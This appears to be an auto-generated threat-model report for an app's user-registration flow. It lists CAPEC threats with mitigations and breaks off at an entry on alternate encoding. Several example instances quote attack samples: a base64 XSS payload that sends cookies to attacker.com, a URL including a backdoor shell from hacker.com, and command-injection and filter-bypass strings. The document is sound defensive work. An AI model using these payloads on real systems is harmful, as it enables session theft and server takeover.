<link href="docs/Stylesheet.css" rel="stylesheet"></link>

## System Description
&nbsp;

User Registration Level 1

&nbsp;




## Dataflow Diagram - Level 1 DFD

![](amapp_dfd_user_reg_1.png)

&nbsp;

## Dataflows
&nbsp;

Name|From|To |Data|Protocol|Port
|:----:|:----:|:---:|:----:|:--------:|:----:|
|Submit registration data|User|AMAPP API|Registration Info|HTTPS|-1|
|Store user data|AMAPP API|AMAPP DB|User Data|SQL/TLS|-1|
|Review registration requests|AMAPP Admin|AMAPP API|Registration Review Action|HTTPS|-1|
|Update approval status|AMAPP API|AMAPP DB|Approval Status|SQL/TLS|-1|
|Notify approval decision|AMAPP API|User|Approval Notification|HTTPS|-1|


## Data Dictionary
&nbsp;

Name|Description|Classification
|:----:|:--------:|:----:|
|Registration Info|User's name, email, password.|UNKNOWN|
|User Data|Stored user account info (hashed password, email, etc.)|UNKNOWN|
|Registration Review Action|Administrator's decision on pending registration.|UNKNOWN|
|Approval Status|Approval or rejection of a user registration.|UNKNOWN|
|Approval Notification|Notification message sent to user.|UNKNOWN|


&nbsp;

## Potential Threats

&nbsp;
&nbsp;

|
<details>
  <summary>   INP02   --   Overflow Buffers</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Very High</p>
  <h6>Example Instances</h6>
  <p>The most straightforward example is an application that reads in input from the user and stores it in an internal buffer but does not check that the size of the input data is less than or equal to the size of the buffer. If the user enters excessive length data, the buffer may overflow leading to the application crashing, or worse, enabling the user to cause execution of injected code.Many web servers enforce security in web applications through the use of filter plugins. An example is the SiteMinder plugin used for authentication. An overflow in such a plugin, possibly through a long URL or redirect parameter, can allow an adversary not only to bypass the security checks but also execute arbitrary code on the target web server in the context of the user that runs the web server process.</p>
  <h6>Mitigations</h6>
  <p>Use a language or compiler that performs automatic bounds checking. Use secure functions not vulnerable to buffer overflow. If you have to use dangerous functions, make sure that you do boundary checking. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Use OS-level preventative functionality. Not a complete solution. Utilize static source code analysis tools to identify potential buffer overflow weaknesses in the software.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/100.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/119.html, http://cwe.mitre.org/data/definitions/680.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AA01   --   Authentication Abuse/ByPass</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/114.html, http://cwe.mitre.org/data/definitions/287.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE02   --   Double Encoding</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.</p>
  <h6>Mitigations</h6>
  <p>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input. Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible. Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.Refer to the RFCs to safely decode URL. Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive. There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/173.html, http://cwe.mitre.org/data/definitions/177.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC01   --   Privilege Abuse</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP07   --   Buffer Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Very High</p>
  <h6>Example Instances</h6>
  <p>Attacker identifies programmatic means for interacting with a buffer, such as vulnerable C code, and is able to provide input to this interaction.</p>
  <h6>Mitigations</h6>
  <p>To help protect an application from buffer manipulation attacks, a number of potential mitigations can be leveraged. Before starting the development of the application, consider using a code language (e.g., Java) or compiler that limits the ability of developers to act beyond the bounds of a buffer. If the chosen language is susceptible to buffer related issues (e.g., C) then consider using secure functions instead of those vulnerable to buffer manipulations. If a potentially dangerous function must be used, make sure that proper boundary checking is performed. Additionally, there are often a number of compiler-based mechanisms (e.g., StackGuard, ProPolice and the Microsoft Visual Studio /GS flag) that can help identify and protect against potential buffer issues. Finally, there may be operating system level preventative functionality that can be applied.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/123.html, http://cwe.mitre.org/data/definitions/119.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DO01   --   Flooding</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Adversary tries to bring a network or service down by flooding it with large amounts of traffic.</p>
  <h6>Mitigations</h6>
  <p>Ensure that protocols have specific limits of scale configured. Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits. Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/125.html, http://cwe.mitre.org/data/definitions/404.html, http://cwe.mitre.org/data/definitions/770.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DO02   --   Excessive Allocation</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.</p>
  <h6>Mitigations</h6>
  <p>Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP08   --   Format String Injection</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks.</p>
  <h6>Mitigations</h6>
  <p>Limit the usage of formatting string functions. Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/135.html, http://cwe.mitre.org/data/definitions/134.html, http://cwe.mitre.org/data/definitions/133.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP12   --   Client-side Injection-induced Buffer Overflow</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Attack Example: Buffer Overflow in Internet Explorer 4.0 Via EMBED Tag Authors often use EMBED tags in HTML documents. For example &lt;EMBED TYPE=audio/midi SRC=/path/file.mid AUTOSTART=true If an attacker supplies an overly long path in the SRC= directive, the mshtml.dll component will suffer a buffer overflow. This is a standard example of content in a Web page being directed to exploit a faulty module in the system. There are potentially thousands of different ways data can propagate into a given system, thus these kinds of attacks will continue to be found in the wild.</p>
  <h6>Mitigations</h6>
  <p>The client software should not install untrusted code from a non-authenticated server. The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers. Perform input validation for length of buffer inputs. Use a language or compiler that performs automatic bounds checking. Use an abstraction library to abstract away risky APIs. Not a complete solution. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Ensure all buffer uses are consistently bounds-checked. Use OS-level preventative functionality. Not a complete solution.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/14.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/353.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP13   --   Command Delimiters</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target&#x27;s inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior. LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database.</p>
  <h6>Mitigations</h6>
  <p>Design: Perform whitelist validation against a positive specification for command length, type, and parameters.Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged accountImplementation: Perform input validation for all remote content.Implementation: Use type conversions such as JDBC prepared statements.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/15.html, http://cwe.mitre.org/data/definitions/146.html, http://cwe.mitre.org/data/definitions/77.html, http://cwe.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/154.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP14   --   Input Data Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>A target application has an integer variable for which only some integer values are expected by the application. But since it does not have any checks in place to validate the value of the input, the attacker is able to manipulate the targeted integer variable such that normal operations result in non-standard values.</p>
  <h6>Mitigations</h6>
  <p>Validation of user input for type, length, data-range, format, etc.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/153.html, http://cwe.mitre.org/data/definitions/20.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR03   --   Dictionary-based Password Attack</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>A system user selects the word treacherous as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks. Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user&#x27;s logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server. Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.See also: CVE-2003-1096</p>
  <h6>Mitigations</h6>
  <p>Create a strong password policy and ensure that your system enforces this policy.Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/16.html, http://cwe.mitre.org/data/definitions/521.html, http://cwe.mitre.org/data/definitions/262.html, http://cwe.mitre.org/data/definitions/263.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AA02   --   Principal Spoof</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials.</p>
  <h6>Mitigations</h6>
  <p>Employ robust authentication processes (e.g., multi-factor authentication).</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/195.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP20   --   iFrame Overlay</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled Don&#x27;t Click. This button is aligned with the invisible Update button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to his/ her Twitter profile.</p>
  <h6>Mitigations</h6>
  <p>Configuration: Disable iFrames in the Web browser.Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/222.html, http://cwe.mitre.org/data/definitions/1021.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP23   --   File Content Injection</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Very High</p>
  <h6>Example Instances</h6>
  <p>PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs. [R.23.2]</p>
  <h6>Mitigations</h6>
  <p>Design: Enforce principle of least privilegeDesign: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.Implementation: Virus scanning on hostImplementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/23.html, http://cwe.mitre.org/data/definitions/20.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC12   --   Privilege Escalation</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.</p>
  <h6>Mitigations</h6>
  <p>Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software. Follow the principle of least privilege when assigning access rights to entities in a software system. Implement separation of privilege - Require multiple conditions to be met before permitting access to a system resource.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/233.html, http://cwe.mitre.org/data/definitions/269.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC13   --   Hijacking a privileged process</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.</p>
  <h6>Mitigations</h6>
  <p>Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software. Follow the principle of least privilege when assigning access rights to entities in a software system. Implement separation of privilege - Require multiple conditions to be met before permitting access to a system resource.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/234.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/648.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC14   --   Catching exception throw/signal from privileged block</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Very High</p>
  <h6>Example Instances</h6>
  <p>Attacker targets an application written using Java&#x27;s AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread. The Attacker could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations.</p>
  <h6>Mitigations</h6>
  <p>Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/236.html, http://cwe.mitre.org/data/definitions/270.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP24   --   Filter Failure through Buffer Overflow</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Attack Example: Filter Failure in Taylor UUCP Daemon Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.</p>
  <h6>Mitigations</h6>
  <p>Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.Pre-design: Use a language or compiler that performs automatic bounds checking.Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.Operational: Use OS-level preventative functionality. Not a complete solution.Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/24.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/680.html, http://cwe.mitre.org/data/definitions/20.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP25   --   Resource Injection</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>A Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as &#x27;../../tomcat/confserver.xml&#x27;, which causes the application to delete one of its own configuration files.</p>
  <h6>Mitigations</h6>
  <p>Ensure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/240.html, https://capec.mitre.org/data/definitions/240.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP26   --   Code Injection</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>When a developer uses the PHP eval() function and passes it untrusted data that an attacker can modify, code injection could be possible.</p>
  <h6>Mitigations</h6>
  <p>Utilize strict type, character, and encoding enforcementEnsure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/242.html, http://cwe.mitre.org/data/definitions/94.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP27   --   XSS Targeting HTML Attributes</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Application allows execution of any Javascript they want on the browser which enables the adversary to steal session tokens and perform malicious activities.</p>
  <h6>Mitigations</h6>
  <p>Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list all input including that which is not expected to have any scripting content.Implementation: The victim should configure the browser to minimize active content from untrusted sources.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/243.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP28   --   XSS Targeting URI Placeholders</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: &lt;html&gt;&lt;body&gt;&lt;script&gt;var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): &lt;a href=INJECTION_POINT&gt;My Link&lt;/a&gt; Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.</p>
  <h6>Mitigations</h6>
  <p>Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcement.Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/244.html, http://cwe.mitre.org/data/definitions/83.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP29   --   XSS Using Doubled Characters</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>By doubling the &lt; before a script command, (&lt;&lt;script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.</p>
  <h6>Mitigations</h6>
  <p>Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and sanitize all user supplied fields.Implementation: The victim should configure the browser to minimize active content from untrusted sources.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/245.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP30   --   XSS Using Invalid Characters</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>The software may attempt to remove a &#x27;javascript:&#x27; URI scheme, but a &#x27;java%00script:&#x27; URI may bypass this check and still be rendered as active javascript by some browsers, allowing XSS or other attacks.</p>
  <h6>Mitigations</h6>
  <p>Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list any input that will be included in any subsequent web pages or back end operations.Implementation: The victim should configure the browser to minimize active content from untrusted sources.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/247.html, https://cwe.mitre.org/data/definitions/86.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP31   --   Command Injection</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Consider a URL &#x27;http://sensitive/cgi-bin/userData.pl?doc=user1.txt&#x27;. If the URL is modified like so - &#x27;http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|&#x27;, it executed the command &#x27;/bin/ls|&#x27;. This is how command injection is implemented.</p>
  <h6>Mitigations</h6>
  <p>All user-controllable input should be validated and filtered for potentially unwanted characters. Whitelisting input is desired, but if a blacklisting approach is necessary, then focusing on command related terms and delimiters is necessary.Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter.Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/248.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP32   --   XML Injection</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.</p>
  <h6>Mitigations</h6>
  <p>Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/250.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP33   --   Remote Code Inclusion</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>URL string http://www.example.com/vuln_page.php?file=http://www.hacker.com/backdoor_ contains an external reference to a backdoor code file stored in a remote location (http://www.hacker.com/backdoor_shell.php.) Having been uploaded to the application, this backdoor can later be used to hijack the underlying server or gain access to the application database.</p>
  <h6>Mitigations</h6>
  <p>Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/253.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP35   --   Leverage Alternate Encoding</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified encoding strings, which allows remote attackers to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka Post Encoding Information Disclosure Vulnerability. Related Vulnerabilities CVE-2010-0488Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.</p>
  <h6>Mitigations</h6>
